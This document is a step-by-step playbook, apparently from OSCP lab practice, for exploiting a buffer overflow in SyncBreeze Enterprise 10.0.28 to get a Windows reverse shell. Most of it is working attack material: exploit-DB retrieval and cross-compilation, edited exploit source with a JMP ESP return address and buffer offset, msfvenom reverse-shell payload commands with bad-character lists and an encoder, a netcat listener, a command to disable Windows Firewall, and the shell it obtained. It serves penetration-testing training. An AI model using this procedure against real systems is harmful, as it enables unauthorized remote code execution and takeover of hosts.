# SyncBreeze 10.0.28 Exploitation - Quick Playbook

## Environment Setup

| Component | Value |
|-----------|-------|
| **Kali IP** | 192.168.45.160 |
| **Target IP** | 192.168.165.10 |
| **Target Port** | 80 (HTTP) |
| **Vulnerability** | Buffer Overflow in POST /login |
| **Exploit DB ID** | 42341 (C) / 42928 (Python) |
| **Application** | SyncBreeze Enterprise 10.0.28 |

---

## Exploitation Steps

### **Step 1: Locate & Copy Exploit**

```bash
searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m 42341
```

**Purpose**: Find C-based buffer overflow exploit for cross-compilation.

---

### **Step 2: Install Cross-Compiler**

```bash
sudo apt install mingw-w64 -y
```

**Purpose**: Install i686-w64-mingw32-gcc to compile Windows executables on Kali.

---

### **Step 3: Initial Compilation Test**

```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

**Purpose**: Compile exploit linking Windows Sockets library (-lws2_32).

---

### **Step 4: Modify Target IP (3 Locations)**

**Edit 42341.c - Line 36:**
```c
server.sin_addr.s_addr = inet_addr("192.168.165.10");
```

**Edit 42341.c - Line 60:**
```c
"Host: 192.168.165.10\r\n"
```

**Edit 42341.c - Line 64:**
```c
"Referer: http://192.168.165.10/login\r\n"
```

**Purpose**: Update socket connection and HTTP headers to match target.

---

### **Step 5: Update Return Address (JMP ESP)**

**Edit 42341.c - Line 74:**
```c
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83 JMP ESP at libspp.dll
```

**Purpose**: Use verified JMP ESP address from Python exploit (EDB 42928).

---

### **Step 6: Generate Shellcode (Attempt 1)**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.191 LPORT=443 \
  EXITFUNC=thread -f c -b "\x00\x0a\x0d\x25\x26\x2b\x3d" --platform windows -a x86
```

**Purpose**: Generate reverse shell payload avoiding bad characters.

**Result**: ❌ Used wrong IP (hardcoded instead of actual).

---

### **Step 7: Fix NULL Terminator Offset (780→781)**

**Edit 42341.c - Line 70:**
```c
int initial_buffer_size = 781;  // Was 780
```

**Purpose**: Account for NULL terminator in strcat() - prevents off-by-one error.

---

### **Step 8: Discover IP Mismatch**

```bash
ip a | grep "inet 192.168"
# Shows: 192.168.45.160 (not .191)
```

**Purpose**: Shellcode connection failed - wrong LHOST in payload.

---

### **Step 9: Regenerate Shellcode (Correct IP)**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.160 LPORT=443 \
  EXITFUNC=thread -f c -b "\x00" --platform windows -a x86
```

**Purpose**: Generate payload with correct Kali IP address.

**Result**: ❌ Shellcode corrupted - Access Violation FFFFFFFD.

---

### **Step 10: Debug Shellcode Corruption**

**Immunity Debugger Analysis**:
- Shellcode arrived intact in memory (ESP dump showed correct bytes)
- Execution failed with Access Violation at FFFFFFFD
- Indicates decoder stub corruption from bad characters

**Root Cause**: Bad characters in encoded payload despite exclusions.

---

### **Step 11: Regenerate Shellcode (Port 4444)**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.160 LPORT=4444 \
  EXITFUNC=thread -f c -b "\x00\x0a\x0d\x25\x26\x2b\x3d" \
  -e x86/shikata_ga_nai --platform windows -a x86
```

**Purpose**: Different port = different encoded bytes (avoid bad chars by chance).

**Result**: ✅ Payload worked!

---

### **Step 12: Disable Windows Firewall**

```powershell
# On Windows VM (PowerShell as Administrator):
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Purpose**: Allow reverse connection from target to Kali port 4444.

---

### **Step 13: Setup Listener**

```bash
nc -nvlp 4444
```

**Purpose**: Listen for incoming reverse shell connection.

---

### **Step 14: Execute Exploit**

```bash
sudo wine syncbreeze_exploit.exe
```

**Expected Output**:
```
[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected
[>] Request sent
```

**Purpose**: Send malicious POST request with buffer overflow payload.

---

### **Step 15: Verify Shell**

**Netcat Listener Output**:
```
listening on [any] 4444 ...
connect to [192.168.45.160] from (UNKNOWN) [192.168.165.10] 49708
Microsoft Windows [Version 10.0.16299.15]
C:\Windows\system32>
```

**Purpose**: Confirm SYSTEM shell obtained.

---

## Troubleshooting Quick Reference

| Issue | Quick Fix |
|-------|-----------|
| **Wine kernel32.dll error** | Use `sudo wine` instead of `wine` |
| **EIP = 41414141** | Offset too small, increase buffer_size |
| **EIP = 9010090c** | Off-by-one error, buffer_size should be 781 |
| **Connection refused** | Check IP with `ip a`, regenerate shellcode |
| **Access Violation FFFFFFFD** | Bad chars in shellcode, try different port |
| **No shell received** | Disable Windows Firewall |
| **Debugger doesn't pause** | Verify JMP ESP address in Immunity |

---

## Final Working Configuration

```c
// Target Configuration
server.sin_addr.s_addr = inet_addr("192.168.165.10");
server.sin_port = htons(80);

// Buffer & Return Address
int initial_buffer_size = 781;  // 780 A's + 1 NULL
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83 JMP ESP

// Shellcode
LHOST=192.168.45.160
LPORT=4444
Bad chars: \x00\x0a\x0d\x25\x26\x2b\x3d
Encoder: x86/shikata_ga_nai
```

---

## Key Takeaways

1. **NULL Terminator**: C string functions stop at `\x00` - account for this in buffer calculations
2. **IP Verification**: Always verify your actual IP with `ip a` before generating shellcode
3. **Bad Characters**: Web exploits have additional bad chars beyond `\x00` (URL encoding, HTTP parsing)
4. **Port Selection**: Changing ports can avoid bad character issues in encoded payload
5. **Firewall**: Windows Firewall blocks reverse connections by default
6. **Cross-Compilation**: mingw-w64 requires `-lws2_32` for network functions

---

## Timeline

| Phase | Time | Cumulative |
|-------|------|------------|
| Setup & Compilation | 10 min | 10 min |
| Exploit Modification | 15 min | 25 min |
| NULL Terminator Debug | 20 min | 45 min |
| IP Mismatch Discovery | 10 min | 55 min |
| Shellcode Corruption Debug | 30 min | 85 min |
| Successful Exploitation | 5 min | 90 min |
| **Total** | **90 min** | |

---

## Web Exploit Checklist

Based on OSCP 14.2.1 - Questions to ask when modifying web exploits:

- [x] **HTTP or HTTPS?** → HTTP (port 80)
- [x] **Specific path?** → Yes, POST /login
- [x] **Pre-authentication?** → Yes, no auth required
- [x] **Authentication method?** → N/A (pre-auth exploit)
- [x] **Request crafting?** → POST with Content-Length header
- [x] **Default settings?** → Uses default port 80, default /login path
- [x] **Self-signed certs?** → N/A (HTTP not HTTPS)
- [ ] **WAF/htaccess?** → Not present in lab (would require evasion techniques)

---

## OSCP Exam Relevance

**This lab demonstrates**:
- Cross-compiling exploits (critical exam skill)
- Modifying socket information in code
- Understanding buffer overflow structure
- Debugging with Immunity Debugger
- Shellcode generation with bad character exclusions
- Troubleshooting failed exploits systematically

**Exam Application**:
- You WILL need to modify public exploits
- You WILL need to debug offset issues
- You WILL need to generate custom shellcode
- You MAY need to cross-compile

**Time Management**:
- Allow 30-60 minutes per exploit modification
- Have fallback exploits ready
- Document what you change

---

**Document Version**: 1.0
**Last Updated**: 2025-10-06
**Lab**: OSCP Chapter 13 - Public Exploits Lab 4
**Status**: ✅ Shell Obtained
